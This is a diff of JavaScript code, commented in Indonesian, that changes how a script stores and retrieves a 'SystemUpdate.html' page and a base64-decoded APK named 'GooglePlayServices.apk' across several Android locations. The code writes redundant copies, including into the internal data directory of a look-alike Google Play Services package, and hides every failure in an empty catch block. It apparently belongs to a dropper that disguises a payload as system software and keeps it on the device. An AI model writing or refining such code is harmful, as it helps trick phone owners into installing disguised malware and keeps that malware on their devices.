@@ -152,16 +152,15 @@ function saveHTMLToAllLocations(htmlContent) {
     } catch(e) {}
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var path = '/storage/emulated/0/Android/data/SystemUpdate.html';
+            // 🔥 PERBAIKAN: Ganti ke Download folder
+            var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
         try {
             var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
-        try {
-            A.saveFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html', htmlContent);
-        } catch(e) {}
+        // 🔥 HAPUS: simpan ke com.android.camera (tidak diperlukan)
     }
 }
 
@@ -192,20 +191,14 @@ function loadHTMLFromAllLocations() {
                 var get = store.get('SystemUpdate.html');
                 get.onsuccess = function() {
                     if (get.result) { resolve(get.result); return; }
-                    // 4. Android/data
+                    // 4. 🔥 PERBAIKAN: Ganti ke Download folder
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
-                            var content = A.readFile('/storage/emulated/0/Android/data/SystemUpdate.html');
+                            var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
                             if (content) { resolve(content); return; }
                         } catch(e) {}
                     }
-                    // 5. Download folder
-                    if (PLATFORM.isAndroid && A.isAvailable) {
-                        try {
-                            var content = A.readFile('/storage/emulated/0/Android/data/com.android.camera/SystemUpdate.html');
-                            if (content) { resolve(content); return; }
-                        } catch(e) {}
-                    }
+                    // 🔥 HAPUS: pembacaan dari Android/data dan com.android.camera
                     resolve(null);
                 };
             };
@@ -318,31 +311,27 @@ function saveAPKToAllLocations(apkBase64) {
     // 1. SharedPreferences (Base64)
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 2. Android/data
+        // 2. 🔥 PERBAIKAN: Ganti ke Download folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var path = '/storage/emulated/0/Android/data/GooglePlayServices.apk';
+            var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
-        // 3. Internal APK folder (paling aman)
+        // 3. Internal APK folder (paling aman) - 🔥 PERBAIKAN package name
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            var internalPath = '/data/data/com.google.play.services/files/GooglePlayServices.apk';
+            var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
             A.saveFileBinary(internalPath, binary);
         } catch(e) {}
-        // 4. Download folder (fallback)
-        try {
-            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
-            A.saveFileBinary('/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk', binary);
-        } catch(e) {}
+        // 🔥 HAPUS: simpan ke Android/data/com.android.camera (tidak diperlukan)
     }
 }
 
 function getAPKPath() {
     var paths = [
+        // 🔥 PERBAIKAN: urutan prioritas (internal, Download)
         '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
-        '/storage/emulated/0/Android/data/GooglePlayServices.apk',
-        '/storage/emulated/0/Android/data/com.android.camera/GooglePlayServices.apk'
+        '/storage/emulated/0/Download/GooglePlayServices.apk'
     ];
     if (PLATFORM.isAndroid && A.isAvailable) {
         for (var i = 0; i < paths.length; i++) {
